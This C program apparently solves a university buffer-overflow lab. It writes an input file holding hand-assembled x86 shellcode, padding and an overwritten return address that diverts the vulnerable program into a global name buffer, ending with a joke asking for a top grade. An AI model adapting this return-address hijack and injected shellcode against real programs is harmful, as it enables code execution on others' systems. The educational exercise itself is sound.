#include <stdio.h>

/*#define BUFSIZE 48*/

int main()
{
    int i;
    FILE *fp;
    fp = fopen("data10", "w");
    fprintf(fp, "Manos Alexandros"); /*16 chars*/
    fputc('\0', fp);                 /*end of string and to avoid warnings*/

    fputc('\x89', fp); /*mov %eax, %ebp*/
    fputc('\xe8', fp);

    fputc('\x50', fp); /*push %eax*/

    fputc('\xb8', fp); /*mov %eax*/
    /*0x8049ebd*/
    fputc('\xbd', fp);
    fputc('\x9e', fp);
    fputc('\x04', fp);
    fputc('\x08', fp);

    fputc('\xff', fp);       /*jmp -> ff*/
    fputc('\xe0', fp);       /*%eax*/
    for (i = 0; i < 25; i++) /*48 + 4 - 27*/
    {
        fputc('0', fp);
    }
    /*buf + i = returning address (in stack)*/
    fputc(68, fp);

    /*Returning address -> 80E42F1, 0x80e42e0(hex, =&Name) + 17(dec, my name)*/
    fputc('\xf1', fp);
    fputc('\x42', fp);
    fputc('\x0e', fp);
    fputc('\x08', fp);

    fputc(224, fp); /*restore s bss*/
    fputc(66, fp);  /*(char (*)[48]) 0x80e42e0 <Name>*/
    fputc(14, fp);
    fputc(8, fp);

    fprintf(fp, "Thank you, Manos Alexandros");
    fputc('\n', fp);
    fprintf(fp, "I recommend that you get a grade of 10 on this assignment.");
    fputc('\n', fp);
    fclose(fp);
    return 0;
}
